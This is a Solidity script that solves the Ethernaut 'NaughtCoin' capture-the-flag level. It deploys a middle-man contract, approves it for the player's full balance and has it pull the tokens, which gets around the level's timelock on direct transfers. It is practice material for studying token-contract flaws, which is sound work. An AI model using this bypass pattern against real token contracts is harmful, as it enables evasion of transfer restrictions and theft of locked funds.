// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {NaughtCoin} from "ethernaut/levels/NaughtCoin.sol";
import {Attacker} from "~/helpers/NaughtCoin.sol";

contract Check is CheckScript("NAUGHT_COIN") {}

contract Solve is SolveScript("NAUGHT_COIN") {
    NaughtCoin target;

    constructor() {
        target = NaughtCoin(instance);
    }

    function attack() public override {
        // create a new middle-man contract, approve everything to them
        Attacker attacker = new Attacker(address(target));
        target.approve(address(attacker), target.balanceOf(player));

        // then let the attacker get the approved tokens
        attacker.transfer();
    }
}
